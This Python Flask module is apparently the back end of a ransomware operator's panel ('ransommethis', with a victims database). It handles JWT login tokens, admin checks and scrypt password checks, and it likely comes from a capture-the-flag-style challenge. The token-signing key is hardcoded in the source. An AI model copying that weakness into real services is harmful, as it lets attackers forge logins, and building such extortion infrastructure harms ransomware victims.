#!/usr/bin/env python

import sqlite3
import sys
import time
from base64 import b64decode
from cmath import e
from contextlib import contextmanager
from datetime import datetime, timedelta
from functools import lru_cache
from hashlib import scrypt
from uuid import UUID

import jwt
from flask import (Flask, flash, jsonify, make_response, redirect,
                   render_template, request)


class InvalidTokenException(Exception):
	pass

class MissingTokenException(InvalidTokenException):
	pass

@contextmanager 
def victimdb():
	victimdb = "/opt/ransommethis/db/victims.db"
	try:
		con = sqlite3.connect(victimdb)
		yield con
	finally:
		con.close()

@contextmanager
def userdb():
	userdb = f"/opt/ransommethis/db/user.db"
	try:
		con = sqlite3.connect(userdb)
		yield con
	finally:
		con.close()

def hmac_key():
	return "xveZHYpG5qqmQeFCezjtof4ZrjCUab7l"


def validate_token(token):
	try:	
		claims = jwt.decode(token, hmac_key(), algorithms=['HS256'])
	except:
		# Either invalid format, expired, or wrong key
		return False
	with userdb() as con:
		row = con.execute('SELECT secret FROM Accounts WHERE uid = ?', (claims['uid'],)).fetchone()
		if row is None:
			return False
		return row[0] == claims['sec']

def generate_token(userName):
	""" Generate a new login token for the given user, good for 30 days"""
	with userdb() as con:
		row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
		now = datetime.now()
		exp = now + timedelta(days=30)
		claims = {'iat': now,
		          'exp': exp,
				  'uid': row[0],
				  'sec': row[1]}
		return jwt.encode(claims, hmac_key(), algorithm='HS256')

def get_uid():
	""" Gets the logged-in user's uid from their token, if it is valid """
	token = request.cookies.get('tok')
	if token == None:
		print("No token cookie found!", file=sys.stderr)
		raise MissingTokenException
	if not validate_token(token):
		raise InvalidTokenException
	return jwt.decode(token, hmac_key(), algorithms=['HS256'])['uid']

def get_username():
	""" Gets the logged-in user's userName """
	uid = get_uid()
	with userdb() as con:
		row = con.execute("select userName from Accounts where uid = ?", (uid,)).fetchone()
		return row[0]

def is_admin():
	""" Is the logged-in user an admin? """	
	uid = get_uid()
	with userdb() as con:
		query = "SELECT isAdmin FROM Accounts WHERE uid = ?"
		row = con.execute(query, (uid,)).fetchone()
		if row is None:
			return False
		return row[0] == 1 

def check_admin(f):
	""" Call f only if user is an admin """
	if not is_admin():
		return render_template("admininvalid.html")
	return f()
	

def login(username, password):
	""" Returns a login cookie, or None if the user cannot be validated """
	with userdb() as con:
		row = con.execute('SELECT pwhash, pwsalt FROM Accounts where userName = ?', (username, )).fetchone()
		if row is None:
			return None
		if scrypt(password, salt=row[1], n=16384, r=8, p=1) != b64decode(row[0]):
			return None
		return generate_token(username)


